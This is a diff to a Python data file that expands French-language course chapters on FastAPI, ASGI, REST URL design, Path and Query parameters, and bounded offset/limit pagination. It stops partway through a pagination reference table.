@@ -1,5 +1,12 @@
 """
-Manuel de Référence Approfondi — Enrichissement des Chapitres (Jours 2 et 3).
+Manuel de Référence Approfondi — Volume II : FastAPI, ASGI & Pydantic v2 (Jours 2 et 3).
+Ouvrage d'ingénierie logicielle couvrant :
+- context : problématique architecturale et enjeux de production
+- deep_sections : monographies techniques approfondies (ASGI 3.0, Uvicorn, Starlette, Pydantic v2, RFC 7807, SQLite ACID)
+- architecture_diagram : topologie mémoire ou trame réseau ASCII
+- reference_table : matrice de synthèse normative
+- pitfalls : anti-patterns de production vs standards industriels
+- practical_exercises : travaux pratiques progressifs post-bootcamp
 """
 
 ENRICHMENT_D2_D3 = {
@@ -8,45 +15,82 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l1": {
         "context": (
-            "Après avoir compris les fondations Python (Jour 0) et le protocole réseau HTTP/JSON (Jour 1), nous "
-            "construisons notre premier serveur d'API avec **FastAPI** et **Uvicorn**.\n"
-            "Pourquoi FastAPI s'est-il imposé comme le standard moderne pour l'ingénierie des APIs Python ? "
-            "Parce qu'il combine la performance asynchrone **ASGI** (Starlette + Uvicorn), la validation automatique "
-            "des types par **Pydantic v2** et la génération native de la documentation **OpenAPI 3.1**. "
-            "Ce chapitre explique comment un script Python devient un **démon réseau ASGI**, comment fonctionne "
-            "le protocole **ASGI**, et comment FastAPI aiguille chaque URL vers la bonne fonction grâce à `app.routes`."
+            "Après avoir établi le modèle mémoire de CPython au Jour 0 et disséqué la pile protocolaire TCP/HTTP/JSON "
+            "au Jour 1, nous franchissons ici le seuil fondateur de l'ingénierie backend : transformer un interpréteur "
+            "Python en un **démon réseau asynchrone** capable de servir des milliers de clients simultanés avec "
+            "**FastAPI** et **Uvicorn**.\n\n"
+            "Pourquoi FastAPI s'est-il imposé en quelques années comme l'étalon industriel des architectures Python chez "
+            "les éditeurs cloud, les banques numériques et les plateformes d'intelligence artificielle ? Parce qu'il "
+            "unifie trois briques autrefois disjointes : un noyau HTTP asynchrone ultra-léger (**Starlette** sur le "
+            "protocole **ASGI 3.0**), un moteur de validation compilé en Rust (**Pydantic v2 / `pydantic-core`**) et la "
+            "synthèse automatique du contrat **OpenAPI 3.1**. Ce chapitre examine sous le capot comment Uvicorn "
+            "orchestre les sockets POSIX et comment FastAPI résout chaque requête à travers `app.routes`."
         ),
         "deep_sections": [
             {
-                "heading": "1. Du Script Éphémère au Serveur Daemon ASGI : le rôle d'Uvicorn",
+                "heading": "1. Du script éphémère au démon réseau : socket POSIX d'écoute et boucle d'événements Uvicorn",
                 "body": (
-                    "Un script Python classique exécute ses lignes de haut en bas puis s'arrête : son processus disparaît "
-                    "de la mémoire.\n"
-                    "Un serveur Web, au contraire, doit rester **en éveil 24h/24** pour répondre aux clients à tout instant :\n"
-                    "- Lorsque vous appelez `uvicorn.run(app, host=\"0.0.0.0\", port=8000)`, Uvicorn ouvre un **Socket TCP "
-                    "d'écoute** attaché au port `8000` et démarre une boucle d'événements asynchrone (`asyncio` / `uvloop`).\n"
-                    "- Dès qu'un client se connecte, Uvicorn lit la trame HTTP brute, trouve la route correspondante dans "
-                    "`app.routes`, exécute votre fonction (`async def` ou `def`), sérialise la réponse JSON et reste disponible pour les autres requêtes concurrentes."
+                    "Un programme Python ordinaire suit une trajectoire linéaire et mortelle : l'interpréteur charge le "
+                    "fichier `.py`, exécute séquentiellement ses instructions du haut vers le bas, puis restitue sa "
+                    "mémoire vive au noyau Linux en terminant son processus avec le code `0`. Un serveur d'API obéit à "
+                    "une physique inverse : il doit demeurer résident en mémoire 24h/24 sous la forme d'un **processus "
+                    "démon (*daemon*)** attentif aux interruptions réseau.\n\n"
+                    "#### Ouverture du descripteur TCP et multiplexage E/S non bloquant (`epoll` / `uvloop`)\n\n"
+                    "Lorsque vous invoquez `uvicorn.run(app, host=\"0.0.0.0\", port=8000)`, Uvicorn demande au noyau du "
+                    "système d'exploitation la création d'un socket TCP (`AF_INET`, `SOCK_STREAM`), l'attache par "
+                    "`bind()` au port `8000` sur toutes les interfaces réseau, puis le bascule en mode passif via "
+                    "`listen()`. Plutôt que d'immobiliser un fil d'exécution système (*OS thread*) par client connecté "
+                    "comme le faisaient les serveurs historiques, Uvicorn démarre une **boucle d'événements asynchrone "
+                    "(`asyncio` accélérée en C par `uvloop`)** adossée à l'appel système Linux `epoll`.\n\n"
+                    "Dès que des octets franchissent la carte réseau, l'analyseur syntaxique C `httptools` découpe la "
+                    "trame HTTP/1.1 en quelques microsecondes, puis Uvicorn invoque votre instance `FastAPI` sans jamais "
+                    "interrompre la surveillance des centaines d'autres connexions actives sur le même processus."
                 )
             },
             {
-                "heading": "2. Qu'est-ce que la norme ASGI (Asynchronous Server Gateway Interface) ?",
+                "heading": "2. Anatomie du protocole ASGI 3.0 (`scope`, `receive`, `send`) et modèle d'exécution dual",
                 "body": (
-                    "Dans l'écosystème Python moderne, **ASGI** est le successeur asynchrone de la norme historique WSGI :\n"
-                    "- Une application ASGI est une coroutine `async def app(scope, receive, send):`.\n"
-                    "- Le dictionnaire `scope` contient toutes les métadonnées de la connexion (`type=\"http\"`, `method`, `path`, `query_string`, `headers`).\n"
-                    "- Contrairement à WSGI qui bloquait un thread entier à chaque attente réseau ou base de données, ASGI permet "
-                    "de traiter des milliers de connexions simultanées (HTTP/1.1, HTTP/2, WebSockets, Server-Sent Events) sans bloquer la boucle d'événements."
+                    "Pendant près de quinze ans, les frameworks Web Python (Flask, Django historique) ont communiqué "
+                    "avec leur serveur HTTP via la norme synchrone **WSGI (PEP 3333)**. WSGI souffrait d'une limite "
+                    "structurelle : un appel `environ -> start_response` est strictement bloquant ; si une requête "
+                    "attend 400 millisecondes une réponse PostgreSQL ou un microservice externe, le thread entier reste "
+                    "paralysé et incapable de gérer des protocoles bidirectionnels comme les WebSockets.\n\n"
+                    "> « Une application ASGI 3.0 est une coroutine unique prenant trois arguments `(scope, receive, send)` qui découple la métadonnée de connexion du flux asynchrone d'événements entrants et sortants. » — Spécification ASGI 3.0 (Django Channels / Starlette)\n\n"
+                    "```python — Signature bas niveau que toute instance FastAPI expose à Uvicorn\n"
+                    "async def app(scope: dict, receive: Callable, send: Callable) -> None:\n"
+                    "    # scope['type'] == 'http', scope['method'] == 'GET', scope['path'] == '/api/v1/sante'\n"
+                    "    event = await receive()  # {'type': 'http.request', 'body': b'', 'more_body': False}\n"
+                    "    await send({'type': 'http.response.start', 'status': 200, 'headers': [(b'content-type', b'application/json')]})\n"
+                    "    await send({'type': 'http.response.body', 'body': b'{\"statut\":\"OK\"}'}) \n"
+                    "```\n\n"
+                    "#### L'arbitrage subtil de FastAPI entre `async def` et `def` standard\n\n"
+                    "FastAPI inspecte la nature de chaque fonction de route à l'enregistrement dans `app.routes`. Si "
+                    "vous déclarez `async def lister():`, FastAPI l'exécute directement sur la boucle d'événements "
+                    "principale d'Uvicorn — offrant une scalabilité maximale à condition de n'y utiliser que des "
+                    "bibliothèques non bloquantes (`await`). Si en revanche vous utilisez un pilote synchrone comme "
+                    "`sqlite3` standard et déclarez `def lister():` (sans `async`), FastAPI délègue automatiquement son "
+                    "exécution à un pool de threads dédié (`anyio.to_thread.run_sync`) afin de protéger la boucle ASGI "
+                    "contre tout gel accidentel !\n\n"
+                    "> [!WARNING] L'erreur cardinale en ASGI : bloquer l'Event Loop dans une route `async def`\n"
+                    "> Appeler `time.sleep(5)` ou `requests.get(url)` à l'intérieur d'une coroutine `async def` fige intégralement l'unique thread de la boucle d'événements du worker Uvicorn : plus aucun autre client ne reçoit le moindre octet pendant 5 secondes. Dans `async def`, toute attente d'entrée/sortie doit céder la main par `await` (`asyncio.sleep`, `httpx.AsyncClient`)."
                 )
             },
             {
-                "heading": "3. Sérialisation JSON Automatique dans FastAPI (`return dict` / `BaseModel` vs `HTMLResponse`)",
+                "heading": "3. Table de routage `app.routes` et pipeline de sérialisation (`jsonable_encoder` vs `HTMLResponse`)",
                 "body": (
-                    "Dans FastAPI, vous n'avez même pas besoin d'appeler une fonction `jsonify()` :\n"
-                    "1. Dès qu'une route `@app.get(...)` ou `@app.post(...)` retourne un `dict`, une `list` ou un modèle Pydantic `BaseModel`, "
-                    "FastAPI le convertit automatiquement via `jsonable_encoder` et renvoie un `JSONResponse` avec l'en-tête **`content-type: application/json`**.\n"
-                    "2. Lorsque vous souhaitez renvoyer une page Web HTML compilée avec Jinja2, vous utilisez `Jinja2Templates(directory=\"templates\")` "
-                    "et `templates.TemplateResponse(request=request, name=\"...\", context={...})` avec `response_class=HTMLResponse`."
+                    "Chaque décorateur `@app.get(\"/api/v1/formations\")` ou `@app.post(\"/api/v1/formations\")` instancie "
+                    "au démarrage un objet `APIRoute` compilé dans la liste ordonnée `app.routes`. Lorsqu'une requête "
+                    "franchit Starlette, le routeur parcourt séquentiellement ces règles : si le chemin correspond "
+                    "ainsi que le verbe HTTP, la fonction cible est appelée ; si le chemin existe mais pour un autre "
+                    "verbe (par exemple `DELETE` sur une route exclusivement `GET`), Starlette répond automatiquement "
+                    "`405 Method Not Allowed` ; si aucun motif ne correspond, il émet `404 Not Found`.\n\n"
+                    "En sortie de fonction, FastAPI épargne au développeur toute conversion manuelle : dès qu'une route "
+                    "retourne un `dict`, une `list`, un scalaire ou une instance Pydantic `BaseModel`, FastAPI traverse "
+                    "récursivement la structure via `jsonable_encoder` (convertissant au passage les types Python `datetime`, "
+                    "`UUID` ou `Decimal` en représentations compatibles JSON), sérialise les octets UTF-8 et expédie un "
+                    "`JSONResponse` muni de l'en-tête normatif `content-type: application/json`. Pour servir ponctuellement "
+                    "une interface Web humaine, il suffit de substituer `response_class=HTMLResponse` combiné au moteur "
+                    "`Jinja2Templates`."
                 )
             }
         ],
@@ -88,8 +132,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le code dans l'atelier ci-dessus pour inspecter le contenu réel de `app.routes` avec `TestClient(app)`.",
-            "Ajoutez une route `@app.get(\"/api/v1/version\")` dans l'exécuteur et vérifiez qu'elle apparaît immédiatement dans la table de routage ASGI."
+            "Exécutez le script dans l'atelier ci-dessus afin d'inspecter le contenu exact de `app.routes` et d'observer les routes documentaires (`/openapi.json`, `/docs`, `/redoc`) greffées nativement par FastAPI.",
+            "Ajoutez une route `@app.get(\"/api/v1/version\")` retournant `{\"version\": app.version}` puis vérifiez avec `TestClient(app)` son code de statut et son en-tête `content-type`."
         ]
     },
 
@@ -98,63 +142,79 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l2": {
         "context": (
-            "N'importe qui peut créer une URL `/api/faireQuelqueChose` qui renvoie du JSON, mais cela n'en fait pas "
-            "une API **RESTful** professionnelle.\n"
-            "Comment les géants technologiques (Stripe, GitHub, Twilio, Google Cloud) nomment-ils leurs URLs pour "
-            "qu'un développeur externe comprenne intuitivement toute l'API en 5 minutes ? Et comment extraire "
-            "et valider proprement un identifiant d'entité (`/formations/42`) ou un critère de recherche (`?salle=Alger`) dans "
-            "FastAPI ? Ce chapitre formalise le **Modèle de Maturité de Richardson** et le système déclaratif de paramètres `Path(...)` et `Query(...)`."
+            "Exposer une fonction Python qui répond du JSON sur `/api/executerOperation` ne suffit nullement à "
+            "construire une architecture **RESTful** pérenne. Lorsque le catalogue d'une institution s'étend sur deux "
+            "cents endpoints consommés par dix équipes externes, l'absence de grammaire d'URL rigoureuse transforme "
+            "rapidement le système d'information en un labyrinthe imprévisible.\n\n"
+            "Comment les grandes plateformes d'ingénierie (Stripe, GitHub, Google Cloud, Kubernetes) structurent-elles "
+            "leur espace d'adressage pour qu'un architecte externe devine l'intégralité du contrat sans même ouvrir la "
+            "documentation ? Et par quel mécanisme interne FastAPI extrait-il, convertit-il et valide-t-il les segments "
+            "dynamiques d'un chemin (`/formations/42`) ainsi que les prédicats de filtrage (`?salle=Alger&duree_min=3`) ? "
+            "Ce chapitre formalise le **Modèle de Maturité de Richardson** et l'introspection déclarative `Path(...)` et `Query(...)`."
         ),
         "deep_sections": [
             {
-                "heading": "1. Le Modèle de Maturité de Richardson (Niveaux 0, 1, 2 et 3)",
+                "heading": "1. Taxonomie architecturale : les quatre niveaux du Modèle de Maturité de Richardson",
                 "body": (
-                    "Élaboré par Leonard Richardson, ce modèle évalue la qualité architecturale d'une API Web sur 4 niveaux :\n"
-                    "- **Niveau 0 (Le marécage du POX / RPC)** : Une seule URL (`POST /api/service`) reçoit des ordres disparates "
-                    "(`{\"action\": \"getFormation\"}`, `{\"action\": \"deleteFormation\"}`). Le protocole HTTP est sous-exploité.\n"
-                    "- **Niveau 1 (Les Ressources nominales)** : Chaque entité métier possède sa propre adresse URL utilisant "
-                    "un **nom au pluriel** (`/api/v1/formations`, `/api/v1/formations/42`), mais on utilise encore souvent `POST` ou `GET` pour tout.\n"
-                    "- **Niveau 2 (Verbes HTTP + Codes de Statut — Le Standard Industriel)** : L'URL identifie la ressource "
-                    "(`/api/v1/formations/42`) et le **verbe HTTP** exprime l'action (`@app.get`, `@app.post`, `@app.put`, `@app.patch`, `@app.delete`), "
-                    "tandis que la réponse utilise le code de statut exact (`200`, `201`, `404`, `422`).\n"
-                    "- **Niveau 3 (HATEOAS)** : La réponse JSON inclut en plus des liens de navigation (`\"links\": {\"self\": \"/api/v1/formations/42\"}`)."
+                    "Formalisé par Leonard Richardson en 2008 pour évaluer la fidélité d'un service Web aux principes "
+                    "REST de Roy Fielding, ce modèle gradue les APIs selon leur exploitation effective du protocole HTTP.\n\n"
+                    "#### Du tunnel RPC opaque (Niveau 0) au standard industriel (Niveau 2)\n\n"
+                    "Au **Niveau 0 (*The Swamp of POX*)**, l'API n'utilise HTTP que comme un tunnel de transport vers une "
+                    "adresse unique (`POST /api/service`) recevant des enveloppes d'ordres hétérogènes telles que "
+                    "`{\"action\": \"lireFormation\", \"id\": 5}` : le routage réseau, le cache HTTP et les journaux "
+                    "d'accès deviennent aveugles. Le **Niveau 1** introduit la notion de **ressources nominales "
+                    "individuelles** (`/api/v1/formations/5`), mais continue souvent de détourner `GET` ou `POST` pour "
+                    "muter ou détruire des états.\n\n"
+                    "Le **Niveau 2** incarne le **standard industriel universel** exigé en production : chaque URL "
+                    "désigne exclusivement un **nom commun au pluriel** identifiant une collection ou une entité "
+                    "(`/api/v1/formations`, `/api/v1/formations/42`), le **verbe HTTP** porte seul l'intention "
+                    "d'opération (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`), et le **code de statut HTTP** (`200`, `201`, "
+                    "`204`, `404`, `422`) traduit fidèlement son dénouement. Le **Niveau 3 (HATEOAS — *Hypermedia As The "
+                    "Engine Of Application State*)** enrichit enfin chaque représentation de liens de transition "
+                    "dynamiques (`_links`), précieux dans les workflows bancaires complexes."
                 )
             },
             {
-                "heading": "2. Path Parameters (`{id}: int`) vs Query Parameters (`Query(...)`) : la règle de décision",
+                "heading": "2. Arbitrage sémantique : Paramètres de Chemin (`Path`) face aux Paramètres de Requête (`Query`)",
                 "body": (
-                    "Quand faut-il mettre un paramètre dans le chemin (`/formations/42`) et quand faut-il le mettre après `?` (`?salle=Alger`) ?\n"
-                    "- **Paramètre de Chemin (`Path Parameter` : `@app.get('/api/formations/{formation_id}')`)** : Utilisé pour "
-                    "**identifier de manière unique une ressource précise**. Si l'identifiant n'existe pas en base, la route lève "
-                    "`raise HTTPException(status_code=404)`. Grâce à l'annotation `formation_id: int`, FastAPI et Pydantic valident automatiquement "
-                    "que la valeur est un entier (et renvoient `422 Unprocessable Entity` si le client envoie `/formations/abc`).\n"
-                    "- **Paramètre de Requête (`Query Parameter` : `/api/formations?salle=Alger&duree_min=3`)** : Tout paramètre de la fonction Python "
-                    "qui ne figure pas entre `{...}` dans le chemin est automatiquement lu dans la Query String ! Si aucune formation ne correspond au filtre, "
-                    "la collection renvoie **`200 OK` avec une liste vide `[]`**."
+                    "Une règle d'architecture immuable gouverne le partage des responsabilités entre le chemin hiérarchique "
+                    "de l'URI et sa *Query String* située après le point d'interrogation `?`.\n\n"
+                    "Le **paramètre de chemin (`@app.get(\"/api/v1/formations/{formation_id}\")`)** sert à **désigner de "
+                    "manière univoque l'identité d'une ressource précise** au sein d'une collection (ou d'une sous-collection "
+                    "telle que `/formations/{formation_id}/inscriptions`). Parce que le client réclame une entité "
+                    "déterminée dont il affirme l'existence, son absence en base de données constitue une anomalie "
+                    "d'adressage qui **doit lever `404 Not Found`**.\n\n"
+                    "À l'inverse, tout argument de la fonction Python qui ne figure pas entre accolades dans le motif "
+                    "d'URL est interprété par FastAPI comme un **paramètre de requête (`Query Parameter`)**, dédié au "
+                    "**filtrage optionnel, à la recherche textuelle, au tri ou à la pagination** d'une collection "
+                    "(`/api/v1/formations?salle=Alger&duree_min=3`). Lorsqu'un prédicat de recherche ne correspond à "
+                    "aucun enregistrement, la collection `/formations` n'en existe pas moins : le serveur renvoie "
+                    "impérativement **`200 OK` contenant un tableau vide `[]`**.\n\n"
+                    "```python — Validation déclarative compilée par Pydantic TypeAdapter dans FastAPI\n"
+                    "from fastapi import FastAPI, Path, Query\n\n"
+                    "@app.get(\"/api/v1/stagiaires/{stagiaire_id}/factures\")\n"
+                    "def lister_factures(\n"
+                    "    stagiaire_id: int = Path(..., ge=1, description=\"Identifiant primaire du stagiaire\"),\n"
+                    "    montant_min: float = Query(0.0, ge=0.0, description=\"Plancher de filtrage en DZD\"),\n"
+                    "):\n"
+                    "    return {\"stagiaire_id\": stagiaire_id, \"filtre_min\": montant_min}\n"
+                    "```"
                 )
             },
             {
-                "heading": "3. Validation déclarative avec `Path(ge=1)` et `Query(default=..., ge=..., le=...)`",
+                "heading": "3. Référentiel comparé des notations de variables de chemin (`{id}` vs `<int:id>` vs `:id`)",
                 "body": (
-                    "Au lieu d'écrire manuellement des blocs `try / except ValueError` et des tests `if duree_min < 1:`, FastAPI "
-                    "permet de déclarer les contraintes directement dans la signature :\n"
-                    "- `stagiaire_id: int = Path(..., ge=1, description=\"ID unique du stagiaire\")`\n"
-                    "- `ht: float = Query(1000.0, gt=0, description=\"Montant HT (> 0)\")`\n"
-                    "Pydantic convertit la chaîne d'URL en `int`/`float`, vérifie les bornes (`ge`, `le`, `gt`) et documente "
-                    "automatiquement ces règles dans Swagger UI (`/docs`)."
-                )
-            },
-            {
-                "heading": "4. Pourquoi voit-on `{variable}`, `<variable>` et `:variable` selon les outils et frameworks ?",
-                "body": (
-                    "En lisant des documentations d'API ou en utilisant différents outils, on rencontre trois notations pour une **variable de chemin** :\n"
-                    "1. **`{variable}` (Syntaxe native de FastAPI, Starlette, OpenAPI 3.1 / Swagger, Spring Boot & f-strings Python)** :\n"
-                    "   - Utilise des accolades `{...}` côté serveur Python : `@app.get(\"/api/formations/{formation_id}\")`.\n"
-                    "   - Le type est déclaré par le *type hint* Python : `def lire(formation_id: int):`.\n"
-                    "2. **`<variable>` et `<int:variable>` (Syntaxe historique Flask / Werkzeug & Django)** :\n"
-                    "   - Utilise des chevrons `<int:id>`. **Attention** : dans FastAPI, n'utilisez jamais `<int:id>`, utilisez toujours `{id}` avec `id: int` !\n"
-                    "3. **`:variable` (Syntaxe Postman, Express.js / Node.js, Ruby on Rails, Go Gin)** :\n"
-                    "   - Dans **Postman**, taper `http://127.0.0.1:8000/api/formations/:id` fait apparaître la clé `id` dans la table *Path Variables*."
+                    "Les ingénieurs naviguant entre plusieurs écosystèmes rencontrent trois conventions syntaxiques "
+                    "pour matérialiser un segment variable d'URL, dont le mélange provoque des bogues silencieux.\n\n"
+                    "> « Un modèle d'URI (URI Template) encadre ses expressions variables par des accolades `{var}` afin de décrire de manière interopérable l'expansion d'identifiants de ressources. » — IETF RFC 6570 (URI Template, Section 1.2)\n\n"
+                    "**FastAPI, Starlette et la norme OpenAPI 3.1** adoptent strictement la notation RFC 6570 à "
+                    "**accolades `{formation_id}`** : le motif d'URL demeure purement déclaratif tandis que la coercition "
+                    "de type (`int`, `UUID`, `str`) et les bornes (`Path(ge=1)`) sont portées par l'annotation de type "
+                    "Python. **Flask (Werkzeug) et Django** recourent historiquement aux chevrons typés `<int:id>` : "
+                    "écrire `<int:id>` dans FastAPI est une erreur grave, car Starlette traitera les caractères `<`, `:` "
+                    "et `>` comme du texte littéral jamais atteint ! Enfin, la notation préfixée par deux-points **`:id`** "
+                    "appartient aux routeurs JavaScript (*Express.js*), Go (*Gin*) ainsi qu'à l'interface cliente "
+                    "**Postman** (qui substitue `:id` avant d'émettre la requête réelle sur le réseau)."
                 )
             }
         ],
@@ -202,8 +262,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Dans l'exécuteur ci-dessus, observez comment `client.get('/api/v1/stagiaires/abc')` déclenche automatiquement une réponse `422 Unprocessable Entity` générée par Pydantic.",
-            "Testez la route réelle `GET /api/sandbox/calcul-tva?ht=2500&taux=19` dans le Client HTTP ou avec `curl`."
+            "Exécutez le script dans l'atelier ci-dessus et inspectez la structure JSON détaillée (`loc`, `msg`, `type`) émise avec le statut `422` lorsque le client appelle `/api/v1/stagiaires/abc`.",
+            "Interrogez l'endpoint `GET /api/sandbox/calcul-tva?ht=2500&taux=19` depuis le Client HTTP intégré puis testez un montant négatif `ht=-100` pour vérifier l'application de la borne déclarative."
         ]
     },
 
@@ -212,48 +272,63 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l3": {
         "context": (
-            "En développement local, votre table SQLite contient 4 formations : faire `SELECT * FROM formations` et "
-            "tout renvoyer d'un bloc prend 1 milliseconde. Mais que se passe-t-il six mois après la mise en production "
-            "lorsque la table des transactions ou des journaux contient **2 000 000 de lignes** ?\n"
-            "Une requête `GET` sans pagination tentera de charger les 2 millions de lignes en RAM Python, de construire "
-            "un fichier JSON de 800 Mo et fera s'écrouler le serveur par manque de mémoire (*Out Of Memory / OOM*). "
-            "La **Pagination**, le **Filtrage** et le **Tri sécurisé** sont donc obligatoires sur toute route de collection."
+            "En environnement de développement local, une table contenant six formations répond à un `SELECT *` en "
+            "moins de cent microsecondes. Cette rapidité trompeuse masque l'une des causes les plus fréquentes "
+            "d'effondrement en production : six mois après le lancement d'un portail national, la table des "
+            "inscriptions ou des écritures comptables dépasse couramment **deux millions de lignes**.\n\n"
+            "Une route `GET` dépourvue de pagination oblige alors le worker Uvicorn à rapatrier l'intégralité de la "
+            "table en mémoire vive Python, à instancier des millions de dictionnaires `PyObject` et à sérialiser un "
+            "bloc JSON de plusieurs centaines de mégaoctets jusqu'à ce que le noyau Linux abatte brutalement le "
+            "processus (*OOM Killer — Out Of Memory*). La **Pagination bornée**, le **Filtrage préalable** et le "
+            "**Tri validé par liste blanche** constituent par conséquent des invariants obligatoires de toute route "
+            "de collection."
         ),
         "deep_sections": [
             {
-                "heading": "1. L'équation mathématique de la Pagination Offset / Limit",
+                "heading": "1. Algèbre de la pagination `Offset / Limit` et calcul exact du plafond de pages",
                 "body": (
-                    "Le standard universel de pagination repose sur deux paramètres passés dans la Query String : **`page`** "
-                    "(le numéro de page souhaité, commençant à `1`) et **`limit`** (le nombre d'éléments par page, par exemple `10` ou `20`).\n"
-                    "- Pour savoir combien d'éléments sauter depuis le début de la collection (**`offset`**), on applique la formule :\n"
-                    "  **`offset = (page - 1) * limit`**\n"
-                    "  - Pour la `page=1` avec `limit=10` : `offset = (1 - 1) * 10 = 0` → éléments d'indices `0` à `9`.\n"
-                    "  - Pour la `page=2` avec `limit=10` : `offset = (2 - 1) * 10 = 10` → éléments d'indices `10` à `19`.\n"
-                    "  - Pour la `page=3` avec `limit=10` : `offset = (3 - 1) * 10 = 20` → éléments d'indices `20` à `29`.\n"
-                    "- Pour calculer le nombre total de pages (**`total_pages`**) par division entière par excès (plafond) :\n"
-                    "  **`total_pages = max(1, (total_items + limit - 1) // limit)`**."
+                    "Le contrat classique de navigation par pages numérotées repose sur deux entiers transmis dans la "
+                    "Query String : **`page`** (l'indice humain de la page désirée, débutant conventionnellement à `1`) "
+                    "et **`limit`** (le cardinal maximal d'enregistrements par fenêtre, typiquement `10`, `20` ou `50`).\n\n"
+                    "#### Décalage d'origine zéro (`offset`) et division entière par excès (`total_pages`)\n\n"
+                    "Les tableaux Python comme la clause SQL `OFFSET` indexant leurs éléments à partir de `0`, la "
+                    "conversion entre le numéro de page et le nombre d'éléments à ignorer obéit à l'identité "
+                    "**`offset = (page - 1) * limit`** : pour `limit = 10`, la page `1` débute à l'indice `0` (`[0:10]`), "
+                    "la page `2` saute les dix premiers éléments (`offset = 10`, tranche `[10:20]`), et ainsi de suite.\n\n"
+                    "Afin de permettre aux interfaces Web et mobiles de dessiner leur barre de navigation sans erreur "
+                    "d'arrondi ni recours fragile aux nombres flottants (`math.ceil`), le nombre total de pages se "
+                    "calcule exclusivement en arithmétique entière via **`total_pages = max(1, (total_items + limit - 1) // limit)`**. "
+                    "Ainsi, 21 éléments découpés par tranches de 10 donnent `(21 + 9) // 10 = 3` pages exactes, tandis "
+                    "qu'une collection vide (`0` élément) conserve conventionnellement `total_pages = 1`."
                 )
             },
             {
-                "heading": "2. Pourquoi borner impérativement `page` et `limit` côté serveur avec `Query(ge=..., le=...)`",
+                "heading": "2. Bornage défensif déclaratif avec `Query(ge=..., le=...)` contre le déni de service mémoire",
                 "body": (
-                    "Si vous déclarez simplement `limit: int = 10` sans bornes, qu'arrive-t-il si un "
-                    "utilisateur malveillant appelle `?page=-5&limit=999999999` ?\n"
-                    "- Un `page` négatif produirait un `offset` négatif incohérent.\n"
-                    "- Un `limit` de 1 milliard contournerait toute votre protection de pagination !\n"
-                    "Dans FastAPI, on encadre donc toujours les deux paramètres avec `Query` :\n"
-                    "- `page: int = Query(1, ge=1)` (au minimum page 1, sinon `422`).\n"
-                    "- `limit: int = Query(10, ge=1, le=50)` (entre 1 et 50 éléments maximum par appel)."
+                    "Implémenter la formule de pagination en écrivant naïvement `def lister(page: int = 1, limit: int = 10):` "
+                    "laisse une brèche béante dans votre périmètre défensif : rien n'empêche un script malveillant "
+                    "d'appeler `GET /api/v1/formations?page=-4&limit=999999999`. Un `page` négatif engendre en Python un "
+                    "indiçage inversé par la fin de liste qui renvoie des données incohérentes, tandis qu'un `limit` "
+                    "astronomique neutralise intégralement la pagination et restaure le risque d'épuisement RAM.\n\n"
+                    "> [!IMPORTANT] Plafonner systématiquement `limit` dans le contrat Pydantic de la route\n"
+                    "> Dans FastAPI, déclarez toujours `page: int = Query(1, ge=1)` et `limit: int = Query(10, ge=1, le=50)`. Le moteur Rust `pydantic-core` intercepte instantanément toute valeur hors bornes avant même l'entrée dans votre code métier, rejette l'appel avec `422 Unprocessable Entity` et publie les contraintes `minimum: 1, maximum: 50` dans le schéma OpenAPI 3.1."
                 )
             },
             {
-                "heading": "3. Validation par Liste Blanche (Whitelist) du Tri Dynamique (`?tri=...&ordre=...`)",
+                "heading": "3. Ordre canonique du pipeline (Filtrer -> Trier -> Paginer) et Liste Blanche de tri",
                 "body": (
-                    "Pour permettre au client de trier les résultats (`?tri=duree_jours&ordre=desc`), le serveur ne doit "
-                    "**jamais** utiliser directement la chaîne envoyée par le client comme nom de clé ou colonne SQL sans vérification.\n"
-                    "On définit un tuple immuable de colonnes autorisées :\n"
-                    "`CHAMPS_TRI_AUTORISES = (\"id\", \"duree_jours\", \"titre\")`.\n"
-                    "Si `tri not in CHAMPS_TRI_AUTORISES`, le serveur rejette immédiatement la requête avec `raise HTTPException(status_code=400, detail=...)`."
+                    "L'exactitude mathématique et l'efficacité CPU d'une route de collection dépendent strictement de "
+                    "l'ordre d'exécution de ses trois transformations. Le serveur doit **premièrement filtrer** "
+                    "l'ensemble selon les critères métier (`?salle=Alger`) et **mesurer immédiatement `total_items`** sur "
+                    "ce sous-ensemble filtré ; calculer `total_items` après le découpage de la tranche renverrait "
+                    "absurdement la taille de la page courante au lieu du volume total de résultats !\n\n"
+                    "Le serveur **trie deuxièmement** ce sous-ensemble réduit, puis **découpe troisièmement** la "
+                    "fenêtre `[offset : offset + limit]`. Pour sécuriser le paramètre dynamique `?tri=duree_jours&ordre=desc`, "
+                    "on ne fait jamais confiance à la chaîne fournie par l'utilisateur : que le tri s'opère en Python "
+                    "(`KeyError` potentielle ou exposition d'attributs internes) ou en SQL (`ORDER BY`, où les marqueurs "
+                    "paramétrés `?` sont syntaxiquement interdits pour les noms de colonnes), le champ de tri doit être "
+                    "contrôlé par un type `Literal[\"id\", \"duree_jours\", \"titre\"]` ou vérifié contre un ensemble "
+                    "immuable (**Whitelist**) côté serveur."
                 )
             }
         ],
@@ -272,11 +347,11 @@ ENRICHMENT_D2_D3 = {
         ),
         "reference_table": {
             "title": "Structure Standard de l'Objet `meta` de Pagination dans une Réponse JSON",
-            "headers": ["Clé JSON dans `meta`", "Type", "Formule de calcul en Python", "Utilité pour l'interface cliente (Web / Mobile)"],
+            "headers": ["Clé JSON dans `meta`", "Type", "Formule / Déclaration en Python FastAPI", "Utilité pour l'interface cliente (Web / Mobile)"],
             "rows": [
                 ["`total_items`", "`int`", "`len(resultats_filtres)` ou `SELECT COUNT(*)`", "Afficher « 48 formations trouvées »"],
-                ["`page`", "`int`", "`max(1, request.args.get('page', 1, type=int))`", "Mettre en surbrillance le numéro de page courant"],
-                ["`limit`", "`int`", "`min(50, max(1, request.args.get('limit', 10, type=int)))`", "Connaître la taille de tranche appliquée"],
+                ["`page`", "`int`", "`page: int = Query(1, ge=1)`", "Mettre en surbrillance le numéro de page courant"],
+                ["`limit`", "`int`", "`limit: int = Query(10, ge=1, le=50)`", "Connaître la taille de tranche appliquée"],
                 ["`total_pages`", "`int`", "`max(1, (total_items + limit - 1) // limit)`", "Générer les boutons de pagination « Page 1 sur 5 »"],
                 ["`has_next`", "`bool`", "`page < total_pages`", "Activer ou griser le bouton « Page suivante »"],
